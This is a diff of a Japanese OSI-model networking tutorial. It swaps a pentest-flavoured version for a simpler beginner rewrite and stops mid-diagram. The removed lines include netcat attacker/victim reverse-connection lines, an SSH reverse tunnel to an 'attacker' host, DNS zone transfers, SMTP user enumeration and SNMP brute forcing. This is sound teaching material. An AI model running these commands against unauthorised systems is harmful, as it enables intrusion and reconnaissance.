@@ -1,4 +1,4 @@
-# OSIモデル
+# OSI参照モデル
 
 > **LearnCybersecurity** | ネットワーク基礎シリーズ
 > 最終更新: 2026年 | 著者: kodoktheGr3at
@@ -6,1132 +6,378 @@
 ---
 
 <!-- LC-CURRICULUM-START -->
-> **カリキュラムID:** `LC-038` | **フェーズ2:** ネットワーキング
-> **想定学習時間:** 6〜8時間 | **レベル:** 初級
-> **前提科目:** LC-005
-> **書籍対応:** Kurose & Ross, Computer Networking 第1-2章、Stallings, Network Security Essentials 第2章
+> **カリキュラムID:** `LC-038` | **フェーズ2:** ネットワーク
+> **想定学習時間:** 6-8時間 | **レベル:** 初級
+> **前提:** LC-005
+> **書籍対応:** Kurose & Ross, Computer Networking Ch.1-2; Stallings, Network Security Essentials Ch.2
 <!-- LC-CURRICULUM-END -->
 
 ## 目次
 
-1. 概要: OSIモデルとは何か
-2. レイヤー1: Physical
-3. レイヤー2: Data Link
-4. レイヤー3: Network
-5. レイヤー4: Transport
-6. レイヤー5: Session
-7. レイヤー6: Presentation
-8. レイヤー7: Application
-9. データのカプセル化
-10. TCPとUDPの比較
-11. 主要なポート
-12. 各層のプロトコル
-13. 各層のネットワーク機器
-14. セキュリティノート: 層ごとの攻撃
-15. 実践的なワークフロー: ネットワーク偵察と分析
+1. OSIモデルとは、そしてなぜ重要か
+2. 7つの層を1つずつ
+3. データの流れ方: カプセル化
+4. TCP と UDP
+5. 知っておくべきポート
+6. どの機器がどの層で働くか
+7. 層ごとの攻撃と防御
+8. 層を使ったトラブルシューティング
+9. OSI と TCP/IP モデル
+10. クイックリファレンス
 
 ---
 
-## 1. 概要: OSIモデルとは何か
+## 重要な用語
 
-OSIモデル（Open Systems Interconnection Model）は、ネットワーク通信システムがどのように機能するかを定義する標準化された概念フレームワークであり、7つの層に分かれている。1984年にISO（国際標準化機構）によって策定された。
+この教材でよく出てくる言葉である。
 
-各層は特定の役割を持ち、直上と直下の層とのみやり取りする。このモデルはあくまで参照用のものであり、実際の実装では通常TCP/IPモデル（4層）が使われる。それでもOSIは、ネットワークの理解、トラブルシューティング、分析のための標準として使われ続けている。
+| 用語 | 意味 |
+|:---|:---|
+| プロトコル | 2台のコンピュータが互いに理解し合えるよう従う、取り決められたルール |
+| 層(レイヤー) | ネットワークにおける1つの「仕事」。各層は自分の仕事を処理し、結果を次の層に渡す |
+| PDU | ある層でのデータのかたまりの呼び名(ビット、フレーム、パケット、セグメント、データ) |
+| MACアドレス | ネットワークカードに刻まれたハードウェアID。1つのローカルネットワークの中で使う |
+| IPアドレス | 異なるネットワークをまたいでデータを届けるための論理アドレス |
+| ポート | そのデータがコンピュータ内のどのプログラム宛てかを示す番号(Web = 80、SSH = 22) |
+| ヘッダー | 各層がデータの前に付け足す追加情報(アドレス、ポートなど) |
+| カプセル化 | 層を下りながらデータをヘッダーで包んでいくこと |
+| フレーム / パケット / セグメント | データリンク層 / ネットワーク層 / トランスポート層でのデータ単位 |
 
-サイバーセキュリティにとって重要な理由:
+---
 
-- 攻撃がどの層で発生するかを理解することは、攻撃ベクターの特定に役立つ。
-- データのカプセル化を理解することは、パケット分析やネットワークフォレンジクスを支える。
-- 各層のプロトコルを知ることは、ファイアウォールやIDS/IPSの設定に役立つ。
-- ネットワーク機器を理解することは、ネットワークペンテストや偵察を支える。
-- 異常なトラフィックを分析することは、脅威ハンティングやインシデントレスポンスを支える。
+## 1. OSIモデルとは、そしてなぜ重要か
 
-### OSIモデルの全体像
+**OSIモデル**(Open Systems Interconnection)は、「コンピュータがネットワークでどう会話するか」を**7つの層**に分け、各層に1つの明確な仕事を割り当てた考え方である。標準化団体ISOが1984年に発表した。
+
+小包を送るところを想像してほしい。ある人が手紙を書き、別の人が封筒に入れて宛名を書き、配送業者が経路を決め、トラックが物理的に運ぶ。各段階は自分の仕事だけを気にかけ、ほかの段階がそれぞれの役目を果たすと信頼している。ネットワークも同じで、各層が自分の役目をこなし、次の層へ引き渡す。
+
+OSIモデルは**学習とトラブルシューティングのための地図**だ。実際のネットワークはもっと単純なTCP/IPモデル(第9節)の上で動いているが、OSIは「どこで何が起きているか」を説明するために誰もが使う共通の言葉になっている。
+
+セキュリティで重要な理由:
+
+- 攻撃が*どの層*で起きているかが分かれば、防御をどこに置けばよいかが分かる(Webファイアウォールはケーブルへの攻撃を止められない)。
+- データが層ごとにどう包まれるかを理解することは、パケット解析の土台になる。
+- どのプロトコルがどの層にあるかを知ることは、ファイアウォールやIDS/IPSのルール作りの指針になる。
+
+### 7つの層をひと目で
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                          OSI MODEL (7 Layers)                           │
-├───────┬──────────────────┬────────────────────────────────────────────┤
-│ Layer │   Name           │  Key Responsibilities                       │
+┌───────┬──────────────────┬────────────────────────────────────────────┐
+│ 層     │   名前           │  役割                                       │
 ├───────┼──────────────────┼────────────────────────────────────────────┤
-│   7   │  Application     │  User-facing protocols (HTTP, FTP, DNS)    │
-│   6   │  Presentation    │  Encoding, encryption, compression         │
-│   5   │  Session         │  Connection management, authentication     │
-│   4   │  Transport       │  TCP/UDP, ports, flow control              │
-│   3   │  Network         │  IP addressing, routing                    │
-│   2   │  Data Link       │  MAC addresses, switches, frames           │
-│   1   │  Physical        │  Cables, signals, bits                     │
+│   7   │  Application     │  アプリが使うプロトコル(HTTP, DNS, SSH)   │
+│   6   │  Presentation    │  書式、暗号化、圧縮                          │
+│   5   │  Session         │  会話の開始・維持・終了                      │
+│   4   │  Transport       │  TCP/UDP、ポート、確実な配送                 │
+│   3   │  Network         │  IPアドレス、ネットワーク間のルーティング    │
+│   2   │  Data Link       │  MACアドレス、スイッチ、フレーム             │
+│   1   │  Physical        │  ケーブル、無線、生のビット                  │
 └───────┴──────────────────┴────────────────────────────────────────────┘
 
-                    Data Unit (PDU) per Layer:
-┌─────────────────────────────────────────────────┐
-│  Layer 7 — Application   →  Data                │
-│  Layer 6 — Presentation  →  Data                │
-│  Layer 5 — Session       →  Data                │
-│  Layer 4 — Transport     →  Segment (TCP)        │
-│                             Datagram (UDP)        │
-│  Layer 3 — Network       →  Packet              │
-│  Layer 2 — Data Link     →  Frame               │
-│  Layer 1 — Physical      →  Bits (0s and 1s)    │
-└─────────────────────────────────────────────────┘
-
-層の順序（上から下）を覚えるための語呂合わせ（英語）:
+覚え方(上から下へ):
   "All People Seem To Need Data Processing"
 ```
 
 ---
 
-## 2. レイヤー1: Physical
+## 2. 7つの層を1つずつ
 
-物理層はOSIモデルの最下層である。物理媒体を通じて生のビット（0と1）を伝送する役割を担う。この層はデータの意味を気にせず、電気、光、または電波信号を一点から別の点へ移動させるだけである。
+### 第1層 — Physical(物理層): 生のビットを運ぶ
 
-主要コンポーネント:
+いちばん下の層。ただの1と0を、電気パルス、光、電波として運ぶ。データの意味は理解せず、信号をAからBへ移すだけだ。ケーブル、光ファイバー、コネクタ、無線、そして信号を中継するだけの機器(ハブ、リピーター)がここにあたる。
 
-- ケーブル（イーサネット、光ファイバー、同軸）
-- 電気信号、光、または電波
-- 物理コネクタとポート（RJ45、SFP、BNC）
-- リピーターとハブ機器
+安全に状態を確認するコマンド:
 
 ```bash
-# Physical layer related commands
-
-# Check network interface status (link up/down = physical layer)
-$ ip link show
-$ ifconfig
-$ ethtool eth0          # NIC speed, duplex, link status
-
-# Windows equivalent
-> ipconfig /all
-> Get-NetAdapter         # PowerShell
-
-# Check cable / physical connection
-$ ethtool eth0 | grep "Link detected"
-Link detected: yes
-
-# Check interface errors (physical issues)
-$ ip -s link show eth0
-$ netstat -i
-$ cat /proc/net/dev
-
-# Wireshark — capture at physical/data link level
-$ tcpdump -i eth0 -n    # capture raw frames
-$ wireshark             # GUI packet capture
+ip link show            # インターフェースはupか?(Linux)
+ethtool eth0            # 速度、デュプレックス、"Link detected: yes"
+ip -s link show eth0    # エラーカウンタ(不良ケーブル、干渉)
 ```
 
-| メディア | 速度 | 最大距離 |
-|---------|------|----------|
-| Cat5e UTP | 1 Gbps | 100メートル |
-| Cat6 UTP | 10 Gbps | 55メートル |
-| 光ファイバー（シングルモード） | 100 Gbps以上 | 40〜80 km |
-| 光ファイバー（マルチモード） | 10 Gbps | 550メートル |
-| Wi-Fi 6（802.11ax） | 9.6 Gbps | 約100メートル |
+| 媒体 | 一般的な速度 | 最大距離 |
+|-------|-------|---------------|
+| Cat5eケーブル | 1 Gbps | 100 m |
+| Cat6ケーブル | 10 Gbps | 55 m |
+| 光ファイバー(シングルモード) | 100 Gbps+ | 40〜80 km |
+| Wi-Fi 6 | 最大約9.6 Gbps | 約100 m |
+
+### 第2層 — Data Link(データリンク層): 隣の機器と話す
+
+この層は**同じローカルネットワーク**内の機器どうしでデータを運び、**MACアドレス**(各ネットワークカードのハードウェアID)を使う。データ単位は**フレーム**。主役の機器は**スイッチ**で、どのMACがどのポートにあるかを学習し、それに従ってフレームを転送する。
+
+```bash
+ip link show      # 自分のMACアドレス
+ip neigh show     # ARPテーブル: どのIPがどのMACに対応するか
+```
+
+知っておくプロトコル: **Ethernet**(有線LANのフレーム)、**ARP**(IPに対応するMACを探す。LC-042で扱う)、**802.1Q**(VLANタグ)、**STP**(スイッチ間のループを防ぐ)。
+
+### 第3層 — Network(ネットワーク層): ネットワーク間の経路を探す
+
+この層は**IPアドレス**を使ってデータをあるネットワークから別のネットワークへ届け、経路を選ぶ。データ単位は**パケット**、主役の機器は**ルーター**。
+
+```bash
+ip addr show          # 自分のIPアドレス
+ip route show         # ルーティングテーブル / デフォルトゲートウェイ
+ping -c 4 8.8.8.8     # そのホストにそもそも届くか?(ICMP)
+traceroute 8.8.8.8    # パケットはどの経路を通るか?
+```
+
+プロトコル: **IPv4/IPv6**(アドレッシング)、**ICMP**(pingやエラーメッセージ)、**OSPF/BGP**(ルーターどうしが経路を共有する)。
+
+### 第4層 — Transport(トランスポート層): 正しいプログラムに確実に届ける
+
+この層は**ポート番号**を使って、単なる機械どうしではなく**プログラムどうし**をつなぐ。主な選択肢は2つ。
+
+- **TCP:** 先に接続を確立し、すべてが順番どおり届くことを保証し、失われたものは再送する。Web、SSH、メールに使う。
+- **UDP:** 準備も保証もなく、ただデータを撃ち出す。より速く、DNS、ビデオ通話、ゲームに使う。
+
+```bash
+ss -tulnp             # どのポートが開いて待ち受けているか(Linux)
+nc -zv host 22        # あるTCPポートに届くか?
+```
+
+### 第5層 — Session(セッション層): 会話を管理する
+
+アプリケーション間の「セッション」を開始し、維持し、きれいに終了させる。転送が途切れたとき、正しい位置から再開できるという考え方がセッション層だ。例: NetBIOSやSMBのセッション(Windowsのファイル共有)、RPC、iSCSI。
+
+### 第6層 — Presentation(プレゼンテーション層): データを翻訳し、守る
+
+「翻訳者」。あるシステムのデータを別のシステムが読めるようにする。文字コード(ASCII、Unicode)、圧縮(gzip)、そして**暗号化(TLSはここ)**だ。Base64や、JPEG/PNGのような画像形式もプレゼンテーション層の話である。
+
+```bash
+echo "Hello" | base64          # エンコード
+echo "SGVsbG8K" | base64 -d    # デコード
+openssl s_client -connect example.com:443 </dev/null   # TLS接続を調べる
+```
+
+### 第7層 — Application(アプリケーション層): プログラムが実際に話す言葉
+
+いちばん上、ユーザーに最も近い層。アプリそのものではなく、アプリが使う**ネットワークプロトコル**のことだ。HTTP、DNS、FTP、SSH、SMTP、SNMP、LDAP、RDP、SMBはすべてここにある。
+
+> 注意: 「アプリケーション層」は**Chrome や Firefox のことではない**。それらのプログラムが話すプロトコル(HTTP)のことだ。
+
+```bash
+curl -I https://example.com    # HTTPレスポンスのヘッダーを見る
+dig example.com                # DNSルックアップ
+```
+
+| プロトコル | ポート | 用途 |
+|----------|------|----------|
+| HTTP / HTTPS | 80 / 443 | Web |
+| DNS | 53 | 名前の解決 |
+| SSH | 22 | 安全なリモートシェル |
+| FTP | 21 | ファイル転送(平文) |
+| SMTP | 25 | メール送信 |
+| SMB | 445 | Windowsのファイル共有 |
+| RDP | 3389 | リモートデスクトップ |
 
 ---
 
-## 3. レイヤー2: Data Link
+## 3. データの流れ方: カプセル化
 
-データリンク層は、同一ネットワークセグメント内で直接接続された2つのノード間の信頼できるデータ転送を担当する。この層はデバイスを識別するためにMACアドレス（Media Access Control）を使い、物理メディアへのアクセスを管理する。
+何かを送るとき、データは自分のマシンで層を**下って**いく。各層が自分の**ヘッダー**でデータを包む。封筒の中に封筒、さらに大きな封筒の中に、という具合だ。受け取る側では、各層が**上って**いきながら自分の封筒を開ける。
 
-この層は2つのサブレイヤーに分かれる。
+```
+自分のコンピュータ(下る)                相手のコンピュータ(上る)
 
-- LLC（Logical Link Control）: フロー制御とエラーチェック
-- MAC（Media Access Control）: 物理アドレッシングとメディアアクセス
+L7  データ                              L7  データ
+L6  データ                              L6  データ
+L5  データ                              L5  データ
+L4  [TCPヘッダー | データ]  = セグメント  L4  [TCPヘッダー | データ]
+L3  [IPヘッダー | セグメント] = パケット  L3  [IPヘッダー | …]
+L2  [MACヘッダー | パケット | FCS] = フレーム L2 [MACヘッダー | … | FCS]
+L1  101000110101...  = ビット            L1  101000110101...
 
-```bash
-# Data Link layer commands
-
-# View MAC addresses
-$ ip link show
-$ arp -a                  # ARP table (IP ↔ MAC mapping)
-$ arp -n
-
-# Windows
-> arp -a
-> getmac /v
-
-# ARP spoofing detection (Wireshark filter)
-# Filter: arp.duplicate-address-detected
-# Filter: arp.src.hw_mac != eth.src
-
-# Send raw Ethernet frames (Layer 2) with Scapy (Python)
-$ python3
->>> from scapy.all import *
->>> frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
->>> sendp(frame, iface="eth0")
-
-# View switch MAC address table (if you have access)
-# Cisco: show mac address-table
-# Linux bridge: bridge fdb show
-
-# 802.1Q VLAN tagging
-$ ip link add link eth0 name eth0.100 type vlan id 100
-$ ip addr add 192.168.100.1/24 dev eth0.100
-
-# Capture Layer 2 traffic
-$ tcpdump -e -i eth0      # -e shows MAC addresses
+            ─────── 物理媒体 ───────>
 ```
 
-| プロトコル | 機能 | ペンテストでの重要度 |
-|-----------|------|------------------------|
-| ARP | IPからMACへの解決 | Critical（ARPスプーフィング） |
-| Ethernet II | 標準LANフレーム | Medium |
-| 802.1Q | VLANタグ付け | High（VLANホッピング） |
-| STP（802.1D） | ネットワークループの防止 | High（STP攻撃） |
-| PPP | ポイントツーポイントリンク | Low |
+各層は*自分の*ヘッダーだけを読む。データ単位は各レベルで名前が変わる。**ビット**(L1)、**フレーム**(L2)、**パケット**(L3)、**セグメント**(L4)、その上は単に**データ**だ。
 
 ---
 
-## 4. レイヤー3: Network
+## 4. TCP と UDP
 
-ネットワーク層はルーティングと論理アドレッシング（IPアドレス）を担当する。複数の異なるネットワークを越えて、送信元から宛先へデータパケットを届ける最適な経路を決定する。この層の主要機器はルーターである。
+どちらも第4層にあるが、ふるまいは大きく違う。
 
-この層のデータ単位はパケットと呼ばれる。
+| 観点 | TCP | UDP |
+|--------|-----|-----|
+| データ単位 | セグメント | データグラム |
+| 接続 | あり(3ウェイハンドシェイク) | なし |
+| 確実か? | はい、失われたデータを再送する | 保証なし |
+| 順番は? | はい | 保証されない |
+| 速度 | 遅い(オーバーヘッドが多い) | 速い |
+| 向いている用途 | Web、SSH、ファイル転送、メール | DNS、ビデオ通話、ゲーム |
 
-```bash
-# Network layer commands
+### TCPの3ウェイハンドシェイク
 
-# IP addressing
-$ ip addr show
-$ ip addr add 192.168.1.10/24 dev eth0
-
-# Routing table
-$ ip route show
-$ route -n
-$ netstat -rn
-
-# Windows
-> route print
-> Get-NetRoute
-
-# Ping — ICMP echo (Layer 3 reachability test)
-$ ping 8.8.8.8
-$ ping -c 4 192.168.1.1   # 4 packets only
-
-# Traceroute — show routing path
-$ traceroute 8.8.8.8       # Linux/Mac
-> tracert 8.8.8.8          # Windows
-$ mtr 8.8.8.8              # real-time traceroute
-
-# IP Subnet calculations
-$ ipcalc 192.168.1.0/24
-$ python3 -c "import ipaddress; print(list(ipaddress.IPv4Network('10.0.0.0/28').hosts()))"
-
-# Wireshark filter for IP layer
-# ip.addr == 192.168.1.1
-# ip.src == 10.0.0.0/8
-# icmp
-
-# Nmap — Layer 3/4 scanning
-$ nmap -sn 192.168.1.0/24         # Ping sweep (host discovery)
-$ nmap -sP 192.168.1.0/24         # ARP + ICMP discovery
-$ nmap -O 192.168.1.1             # OS detection (TTL analysis)
-```
-
-| プロトコル | 機能 | ペンテストでの重要度 |
-|-----------|------|------------------------|
-| IPv4 | 32ビットアドレッシング | High |
-| IPv6 | 128ビットアドレッシング | High |
-| ICMP | 制御・エラーメッセージ | High（ICMPフラッド） |
-| OSPF | 動的ルーティングプロトコル | Medium |
-| BGP | AS間ルーティング | High（BGPハイジャック） |
-| IPSec | IPの暗号化と認証 | Low |
-
----
-
-## 5. レイヤー4: Transport
-
-トランスポート層は、異なるホスト上のアプリケーション間のエンドツーエンド通信を担当する。通信するサービス/アプリケーションを識別するためにポート番号を使い、フロー制御、エラー回復、データセグメンテーションの仕組みを提供する。
-
-主要な2つのプロトコル:
-
-- TCP（Transmission Control Protocol）: 接続指向、信頼性あり、順序保証あり
-- UDP（User Datagram Protocol）: コネクションレス、高速、配送保証なし
-
-```bash
-# Transport layer commands
-
-# View open ports & connections
-$ ss -tulnp               # preferred (modern)
-$ netstat -tulnp           # traditional
-$ netstat -ano             # Windows
-
-# Windows PowerShell
-PS> Get-NetTCPConnection
-PS> Get-NetUDPEndpoint
-
-# TCP 3-way handshake (SYN-SYN/ACK-ACK)
-# Wireshark filter: tcp.flags.syn==1
-# Wireshark filter: tcp.stream eq 0
-
-# Port scanning with Nmap
-$ nmap -sT 192.168.1.1         # TCP connect scan (full handshake)
-$ nmap -sS 192.168.1.1         # SYN stealth scan (half-open)
-$ nmap -sU 192.168.1.1         # UDP scan
-$ nmap -p 80,443,8080 192.168.1.1   # specific ports
-$ nmap -p- 192.168.1.1         # all 65535 ports
-$ nmap -sV 192.168.1.1         # service version detection
-
-# Netcat — TCP/UDP raw connections
-$ nc -lvnp 4444               # listen (attacker)
-$ nc 192.168.1.10 4444        # connect (victim → attacker)
-$ nc -u 192.168.1.1 53        # UDP mode
-$ nc -zv 192.168.1.1 22       # port check (banner grab)
-
-# Banner grabbing
-$ nc -nv 192.168.1.1 80
-HEAD / HTTP/1.0
-
-# Check for SYN flood (DoS attack detection)
-$ netstat -an | grep SYN_RECV | wc -l
-```
-
-### TCPとUDPの比較
-
-| 特徴 | TCP | UDP |
-|------|-----|-----|
-| 接続 | 接続指向（3ウェイハンドシェイク） | コネクションレス |
-| 信頼性 | 保証あり、ACKを使う | 保証なし、送りっぱなし |
-| 順序 | 順序保証あり | 順序が入れ替わることがある |
-| 速度 | 遅い（オーバーヘッドあり） | 速い |
-| 用途 | HTTP、SSH、FTP、メール | DNS、DHCP、VoIP、動画ストリーミング |
-
-### TCP 3ウェイハンドシェイク
+TCPは本物のデータを送る前に、両者が3ステップで挨拶を交わす。電話のようなものだ。「聞こえる?」—「うん、そっちは聞こえる?」—「うん」。
 
 ```
 Client                          Server
-  │                               │
-  │──── SYN (seq=100) ───────────>│   Step 1: Client initiates
-  │                               │
-  │<─── SYN+ACK (seq=200,ack=101)─│   Step 2: Server acknowledges + syncs
-  │                               │
-  │──── ACK (ack=201) ───────────>│   Step 3: Client acknowledges
-  │                               │
-  │<════ DATA TRANSFER ══════════>│   Connection established!
-  │                               │
-  │──── FIN ─────────────────────>│   Step 4: Teardown (4-way)
-  │<─── ACK ──────────────────────│
-  │<─── FIN ──────────────────────│
-  │──── ACK ─────────────────────>│   Connection closed
+  │──── SYN ─────────────────────>│   1. 「話したい」
+  │<─── SYN + ACK ────────────────│   2. 「いいよ、こちらも話したい」
+  │──── ACK ─────────────────────>│   3. 「よし、始めよう」
+  │<════ 両方向にデータが流れる ══>│
 ```
+
+接続を閉じるときも、両方向で同じような丁寧なやりとり(FIN / ACK)を行う。
 
 ---
 
-## 6. レイヤー5: Session
+## 5. 知っておくべきポート
 
-セッション層は、アプリケーション間の通信セッションの確立、管理、終了を担当する。接続が中断された場合に、適切な場所からセッションを再開できるようにする（チェックポイント）。またダイアログ制御（半二重 対 全二重）も管理する。
+**ポート**は0から65535までの番号で、そのトラフィックがマシン内のどのサービス宛てかを示す。3つの範囲がある。
+
+- **0〜1023:** よく知られたポート(HTTP 80、SSH 22)。多くのシステムでは管理者だけが開ける。
+- **1024〜49151:** 特定のアプリ向けに登録されたポート。
+- **49152〜65535:** 一時的なポート。外向きの接続ごとに自動で選ばれる。
 
 ```bash
-# Session layer examples
-
-# NetBIOS — Session Layer protocol (Windows networking)
-$ nmblookup -A 192.168.1.1    # NetBIOS name lookup
-$ nbtscan 192.168.1.0/24      # scan for NetBIOS names
-
-# RPC (Remote Procedure Call) — Session layer
-$ rpcinfo -p 192.168.1.1      # list RPC services
-$ showmount -e 192.168.1.1    # NFS shares (uses RPC)
-
-# SMB Session (Windows file sharing)
-$ smbclient -L //192.168.1.1  # list SMB shares
-$ smbclient //192.168.1.1/share -U username
-
-# Session hijacking detection (Wireshark)
-# Filter: tcp.seq or unexpected RST packets
-# Look for duplicate SEQ numbers
-
-# SQL*Net (Oracle DB sessions) — port 1521
-# iSCSI sessions — port 3260
-
-# SSH — manages sessions with keep-alive
-$ ssh -o ServerAliveInterval=60 user@host
+# 自分が所有するホストで、何が開いているかを調べる正当な方法
+nmap host              # よく使われるポート
+nmap -p- host          # すべてのポート
+nc -zv host 443        # 特定のポートを1つ確認
 ```
 
-| プロトコル | 機能 | ペンテストでの重要度 |
-|-----------|------|------------------------|
-| NetBIOS | Windowsの名前解決サービス | High |
-| RPC | リモートプロシージャコール | High |
-| SMB | Windowsファイル共有 | Critical |
-| SQL*Net | OracleDBセッション | Medium |
-| iSCSI | ネットワーク越しのストレージ | Medium |
+| ポート | サービス | なぜ注意が必要か |
+|------|---------|--------------------|
+| 21 | FTP | パスワードを平文で送る |
+| 22 | SSH | よくあるログインの標的。パスワードではなく鍵を使う |
+| 23 | Telnet | 平文。廃止すべき |
+| 25 | SMTP | メール。ユーザー列挙やスパム中継に悪用されうる |
+| 53 | DNS | 内部の名前を漏らしうる(ゾーン転送) |
+| 80 / 443 | HTTP / HTTPS | Web攻撃の全領域 |
+| 139 / 445 | NetBIOS / SMB | Windowsのファイル共有。歴史的に非常に悪用されてきた |
+| 3389 | RDP | リモートデスクトップ。ブルートフォースの頻繁な標的 |
+| 3306 / 5432 | MySQL / PostgreSQL | 弱い、またはデフォルトのログインで露出したデータベース |
+| 6379 | Redis | 認証なしのまま放置されがち |
 
 ---
 
-## 7. レイヤー6: Presentation
+## 6. どの機器がどの層で働くか
 
-プレゼンテーション層はネットワークの「翻訳者」である。データフォーマット、暗号化/復号、圧縮を担当する。内部フォーマットが異なっていても、あるアプリケーションが送ったデータを別のアプリケーションが読めるようにする。
+| 層 | 機器 | 役割 |
+|-------|-----------|-------|
+| 7 Application | Webファイアウォール(WAF)、プロキシ、ロードバランサ | HTTP/TLSのフィルタと検査 |
+| 4 Transport | ステートフルファイアウォール | ポートと接続で許可/拒否 |
+| 3 Network | ルーター、L3スイッチ | ネットワーク間のルーティング |
+| 2 Data Link | スイッチ、ブリッジ、アクセスポイント | MACでフレームを転送 |
+| 1 Physical | ハブ、リピーター、ケーブル、NIC | 信号を運ぶ |
 
-主な責任:
-
-- エンコード/デコード: ASCII、Unicode、EBCDIC
-- 暗号化/復号: SSL/TLSがここで動作する
-- 圧縮/解凍: gzip、zlib
+自分のマシンが使っている第3層のルーターをすぐ確認する方法:
 
 ```bash
-# Presentation layer — encoding, encryption, compression
-
-# Base64 encoding/decoding
-$ echo "Hello World" | base64
-SGVsbG8gV29ybGQK
-$ echo "SGVsbG8gV29ybGQK" | base64 -d
-Hello World
-
-# URL encoding
-$ python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
-hello%20world
-
-# SSL/TLS certificate inspection (HTTPS = TLS at Presentation layer)
-$ openssl s_client -connect google.com:443
-$ openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
-
-$ curl -v https://google.com 2>&1 | grep -E "SSL|TLS|cipher"
-
-# Check SSL/TLS version & ciphers (pentesting)
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ sslscan target.com
-$ testssl.sh target.com
-
-# Identify file encoding/format
-$ file suspicious.bin
-$ xxd suspicious.bin | head -20     # hex dump
-$ strings suspicious.bin | head -20  # extract strings
-
-# Common encoding conversions (Python)
-$ python3 -c "
-data = 'Hello'
-print('Base64:', __import__('base64').b64encode(data.encode()).decode())
-print('Hex:', data.encode().hex())
-print('URL:', __import__('urllib.parse').quote(data))
-"
-```
-
-| フォーマット / プロトコル | 機能 | ペンテストでの重要度 |
-|--------------------------|------|------------------------|
-| SSL/TLS | トランスポート暗号化 | High（SSLstrip、ダウングレード） |
-| ASCII/Unicode | テキストエンコーディング | Medium |
-| Base64 | バイナリからテキストへのエンコーディング | High（ペイロードの難読化） |
-| gzip/zlib | データ圧縮 | Low |
-| JPEG/PNG/GIF | 画像フォーマット | Medium（ステガノグラフィ） |
-| MIME | メールのマルチパートフォーマット | Medium |
-
----
-
-## 8. レイヤー7: Application
-
-アプリケーション層はOSIモデルの最上層であり、エンドユーザーと直接やり取りする唯一の層である。アプリケーションとネットワークの間のインターフェースを提供し、アプリケーションが通信に使うプロトコルを定義する。
-
-> 注: アプリケーション層はアプリケーション自体（ChromeやFirefoxなど）を意味しない。それらのアプリケーションが使うネットワークプロトコルのことを指す。
-
-```bash
-# Application layer — common protocols & tools
-
-# HTTP / HTTPS
-$ curl -v http://target.com                  # verbose HTTP request
-$ curl -X POST -d "user=admin&pass=123" http://target.com/login
-$ wget http://target.com/file.txt
-
-# DNS — Domain Name System
-$ dig google.com                             # full DNS lookup
-$ dig google.com A                           # IPv4 record
-$ dig google.com MX                          # Mail exchange
-$ dig google.com NS                          # Name servers
-$ dig @8.8.8.8 google.com                   # use specific DNS server
-$ host google.com
-$ nslookup google.com
-
-# DNS zone transfer (pentesting!)
-$ dig axfr @ns1.target.com target.com
-$ fierce --domain target.com                # DNS brute force
-
-# FTP
-$ ftp 192.168.1.1
-$ ftp -n 192.168.1.1 <<EOF
-  user anonymous ""
-  ls
-  bye
-EOF
-
-# SSH
-$ ssh user@192.168.1.1
-$ ssh -p 2222 user@192.168.1.1              # non-default port
-$ ssh -L 8080:internal:80 user@bastion      # local port forward
-$ ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel
-
-# SMTP — Email
-$ nc -v mail.target.com 25
-EHLO test.com
-VRFY admin@target.com                       # user enumeration!
-
-# SNMP — Network Management
-$ snmpwalk -c public -v 2c 192.168.1.1     # community string: public
-$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
-
-# Application layer scanning (Nmap scripts)
-$ nmap --script http-title -p 80,443 192.168.1.0/24
-$ nmap --script http-robots.txt target.com
-$ nmap --script smtp-enum-users target.com
-$ nmap --script dns-brute target.com
-$ nmap --script ftp-anon target.com         # anonymous FTP check
-$ nmap --script smb-vuln-* 192.168.1.1     # SMB vulnerabilities
-```
-
-| プロトコル | ポート | 機能 | ペンテストでの重要度 |
-|-----------|--------|------|------------------------|
-| HTTP | 80 | 非暗号化Web | High |
-| HTTPS | 443 | 暗号化Web | High |
-| DNS | 53 | ドメイン名解決 | High |
-| FTP | 21 | ファイル転送（平文） | Critical |
-| SSH | 22 | セキュアシェル | High |
-| Telnet | 23 | 非セキュアなシェル | Critical |
-| SMTP | 25 | メール送信 | High |
-| POP3 | 110 | メール取得 | Medium |
-| IMAP | 143 | メール管理 | Medium |
-| SNMP | 161 | ネットワーク管理 | High |
-| LDAP | 389 | ディレクトリサービス | High |
-| RDP | 3389 | リモートデスクトップ | Critical |
-| SMB | 445 | Windowsファイル共有 | Critical |
-| MSSQL | 1433 | SQL Server | High |
-| MySQL | 3306 | MySQLデータベース | High |
-| RPC | 135 | リモートプロシージャコール | High |
-
----
-
-## 9. データのカプセル化
-
-カプセル化とは、各OSI層が下の層に渡す前にデータへヘッダー（時にはトレーラーも）を追加していくプロセスである。逆のプロセスはデカプセル化と呼ばれ、受信側で行われる。
-
-```
-Sender (Encapsulation)                    Receiver (De-encapsulation)
-──────────────────────────────────────────────────────────────────────
-
-Layer 7 — Application                     Layer 7 — Application
-┌─────────────────────────┐               ┌─────────────────────────┐
-│         DATA            │               │         DATA            │
-└─────────────────────────┘               └─────────────────────────┘
-            ↓ Add L7 header                           ↑ Remove L7 header
-
-Layer 6 — Presentation                    Layer 6 — Presentation
-┌──────┬──────────────────┐               ┌──────┬──────────────────┐
-│  L6H │       DATA       │               │  L6H │       DATA       │
-└──────┴──────────────────┘               └──────┴──────────────────┘
-            ↓ Add L5 header                           ↑ Remove L5 header
-
-Layer 5 — Session                         Layer 5 — Session
-┌───┬──┬──────────────────┐               ┌───┬──┬──────────────────┐
-│L5H│L6│       DATA       │               │L5H│L6│       DATA       │
-└───┴──┴──────────────────┘               └───┴──┴──────────────────┘
-            ↓ Add TCP/UDP header                       ↑ Remove L4 header
-
-Layer 4 — Transport     [SEGMENT]         Layer 4 — Transport
-┌─────────────┬───────────────────────┐   ┌─────────────┬──────────┐
-│  TCP Header │     DATA (Payload)    │   │  TCP Header │  Data    │
-│ src/dst port│                       │   └─────────────┴──────────┘
-└─────────────┴───────────────────────┘
-            ↓ Add IP header                            ↑ Remove IP header
-
-Layer 3 — Network       [PACKET]          Layer 3 — Network
-┌──────────┬──────────────────────────┐   ┌──────────┬─────────────┐
-│ IP Header│   TCP Header + Data      │   │ IP Header│    Data     │
-│ src/dst IP│                         │   └──────────┴─────────────┘
-└──────────┴──────────────────────────┘
